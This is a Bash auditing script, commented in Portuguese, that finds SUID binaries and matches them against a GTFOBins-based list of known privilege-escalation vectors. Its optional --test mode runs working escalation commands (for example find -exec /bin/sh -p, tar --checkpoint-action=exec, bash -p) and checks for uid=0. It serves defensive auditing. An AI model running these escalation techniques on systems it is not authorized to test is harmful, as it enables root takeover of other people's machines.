#!/bin/bash
#
# Auditoria de binários SUID para detecção de possíveis
# vetores de escalada de privilégio (baseado em técnicas conhecidas do GTFOBins).
#
# USO AUTORIZADO APENAS: rode isso somente em sistemas que você possui ou
# tem permissão explícita para testar (seu próprio laptop, CTF, ambiente de
# pentest autorizado). Executar em sistemas de terceiros sem autorização é
# ilegal na maioria das jurisdições.
#
# Modos:
#   --scan   (padrão) apenas identifica binários SUID presentes na lista de
#            risco conhecida (GTFOBins) e reporta, SEM tentar explorar nada.
#   --test   além de identificar, tenta de fato invocar a técnica de escalada
#            para confirmar exploração (pode ter efeitos colaterais: pode
#            abrir shells, criar processos filhos, etc). Use com cautela.
#
# Saída: relatório legível + log em JSON-lines para processamento posterior.

set -uo pipefail

MODE="scan"
LOGDIR="$(mktemp -d /tmp/suid_audit.XXXXXX)"
REPORT="$LOGDIR/report.txt"
JSONL="$LOGDIR/findings.jsonl"
TIMEOUT_SECS=3

usage() {
    cat <<EOF
Uso: $0 [--scan|--test] [--timeout N]

  --scan        (padrão) apenas detecta binários SUID com técnica conhecida
                de escalada no GTFOBins. Não executa nada potencialmente perigoso.
  --test        tenta confirmar a exploração de fato (efeitos colaterais possíveis).
  --timeout N   timeout em segundos para cada teste (padrão: 3)
  -h, --help    mostra esta ajuda
EOF
    exit 1
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --scan) MODE="scan"; shift ;;
        --test) MODE="test"; shift ;;
        --timeout) TIMEOUT_SECS="${2:-3}"; shift 2 ;;
        -h|--help) usage ;;
        *) echo "Opção desconhecida: $1"; usage ;;
    esac
done

mkdir -p "$LOGDIR"
: > "$REPORT"
: > "$JSONL"

log() {
    echo -e "$1" | tee -a "$REPORT"
}

json_log() {
    # json_log <binario> <tecnica> <status> <detalhe>
    local bin="$1" tech="$2" status="$3" detail="$4"
    printf '{"binary":"%s","technique":"%s","status":"%s","detail":"%s","mode":"%s"}\n' \
        "$bin" "$tech" "$status" "${detail//\"/\\\"}" "$MODE" >> "$JSONL"
}

log "[+] Modo: $MODE"
log "[+] Timeout por teste: ${TIMEOUT_SECS}s"
log "[+] Diretório de log: $LOGDIR"
log "[+] Buscando arquivos SUID no sistema...\n"

mapfile -t suid_bins < <(find / -xdev \( -path /proc -o -path /sys \) -prune -o -perm -4000 -type f -print 2>/dev/null)

if [[ ${#suid_bins[@]} -eq 0 ]]; then
    log "[!] Nenhum binário SUID encontrado (ou sem permissão de leitura)."
    exit 0
fi

log "[+] ${#suid_bins[@]} binário(s) SUID encontrado(s). Verificando contra lista de risco (GTFOBins)...\n"

# Checa se o dono do SUID é root — só importa escalada se for root quem seta o bit.
owned_by_root() {
    local f="$1"
    [[ "$(stat -c '%U' "$f" 2>/dev/null)" == "root" ]]
}

# Confere se uma saída indica de fato uid=0 (shell root), evitando falso
# positivo por coincidência textual.
indicates_root_shell() {
    local outfile="$1"
    [[ -s "$outfile" ]] && grep -qE '^uid=0\(root\)' "$outfile"
}

run_test() {
    local bin="$1" label="$2" outfile="$3"
    shift 3
    timeout "$TIMEOUT_SECS" "$@" </dev/null &>"$outfile"
}

# Lista de técnicas conhecidas (nome do binário -> comando de teste).
# Baseado em GTFOBins (https://gtfobins.github.io/) — apenas os binários mais
# comumente abusados. Isso é SOMENTE para auditoria defensiva.
declare -A KNOWN_RISKY=(
    [ksu]="shell"
    [su]="shell"
    [sudo]="info"
    [mount]="info"
    [pkexec]="shell"
    [sg]="shell"
    [crontab]="info"
    [nmap]="shell"
    [find]="shell"
    [bash]="shell"
    [perl]="shell"
    [python]="shell"
    [python3]="shell"
    [vim]="shell"
    [vi]="shell"
    [awk]="shell"
    [env]="shell"
    [less]="shell"
    [more]="shell"
    [man]="shell"
    [tar]="shell"
    [zip]="shell"
    [cp]="file-write"
    [chmod]="file-write"
    [taskset]="shell"
    [nice]="shell"
    [ionice]="shell"
)

found_any=0

for bin in "${suid_bins[@]}"; do
    name=$(basename "$bin")
    tech="${KNOWN_RISKY[$name]:-}"

    if [[ -z "$tech" ]]; then
        continue
    fi

    found_any=1
    root_owned="não"
    owned_by_root "$bin" && root_owned="sim"

    log "[*] Detectado: $bin (dono root: $root_owned) — técnica conhecida: $name ($tech)"
    json_log "$bin" "$name" "detected" "owned_by_root=$root_owned"

    if [[ "$root_owned" != "sim" ]]; then
        log "    -> Ignorando teste: SUID não pertence a root, risco de escalada é baixo/nulo."
        continue
    fi

    if [[ "$MODE" == "scan" ]]; then
        log "    -> Modo --scan: não executado. Rode com --test para confirmar."
        continue
    fi

    # MODO --test: tenta confirmar de fato, com timeout e sem travar em stdin.
    outfile="$LOGDIR/${name}.out"
    case "$name" in
        ksu)      run_test "$bin" "$name" "$outfile" "$bin" -q -e /bin/sh -c 'id' ;;
        su)       run_test "$bin" "$name" "$outfile" "$bin" -c 'id' ;;
        sudo)     run_test "$bin" "$name" "$outfile" "$bin" -l ;;
        mount)    run_test "$bin" "$name" "$outfile" "$bin" --fake-option ;;
        pkexec)   run_test "$bin" "$name" "$outfile" "$bin" /bin/sh -c 'id' ;;
        sg)       run_test "$bin" "$name" "$outfile" "$bin" root -c 'id' ;;
        crontab)  run_test "$bin" "$name" "$outfile" "$bin" -l ;;
        nmap)     run_test "$bin" "$name" "$outfile" "$bin" --interactive ;;
        find)     run_test "$bin" "$name" "$outfile" "$bin" . -maxdepth 0 -exec /bin/sh -p -c id \; ;;
        bash)     run_test "$bin" "$name" "$outfile" "$bin" -p -c 'id' ;;
        perl)     run_test "$bin" "$name" "$outfile" "$bin" -e 'print `id`;' ;;
        python|python3) run_test "$bin" "$name" "$outfile" "$bin" -c 'import os; os.system("id")' ;;
        vim|vi)   run_test "$bin" "$name" "$outfile" "$bin" -c ':!id' -c ':q!' ;;
        awk)      run_test "$bin" "$name" "$outfile" "$bin" 'BEGIN {system("id")}' ;;
        env)      run_test "$bin" "$name" "$outfile" "$bin" /bin/sh -p -c 'id' ;;
        less|more) run_test "$bin" "$name" "$outfile" "$bin" -- /dev/null ;; # interação manual real; pulado no automático
        man)      run_test "$bin" "$name" "$outfile" "$bin" man ;;
        tar)      run_test "$bin" "$name" "$outfile" "$bin" --checkpoint=1 --checkpoint-action=exec=/bin/sh -p -c id -cf /dev/null . ;;
        zip)      run_test "$bin" "$name" "$outfile" "$bin" --help ;; # zip precisa de setup de arquivo, só checagem básica
        taskset|nice|ionice) run_test "$bin" "$name" "$outfile" "$bin" /bin/sh -p -c 'id' ;;
        *)        : ;;
    esac

    if indicates_root_shell "$outfile"; then
        log "    -> [!] CONFIRMADO: possível escalada de privilégio via $bin"
        json_log "$bin" "$name" "confirmed" "saida_salva_em=$outfile"
    else
        log "    -> Não confirmado neste teste (pode exigir interação manual, ex: less/vim/man)."
        json_log "$bin" "$name" "not_confirmed" "saida_salva_em=$outfile"
    fi
done

if [[ "$found_any" -eq 0 ]]; then
    log "\n[+] Nenhum binário da lista de risco conhecida (GTFOBins) foi encontrado com SUID."
fi

log "\n[+] Fim da auditoria."
log "[+] Relatório completo: $REPORT"
log "[+] Log estruturado (JSONL): $JSONL"
log "\nObservação: ausência de alerta não significa ausência de vulnerabilidade —"
log "apenas que as técnicas conhecidas testadas não confirmaram escalada. Revise"
log "manualmente binários SUID não listados contra https://gtfobins.github.io/"
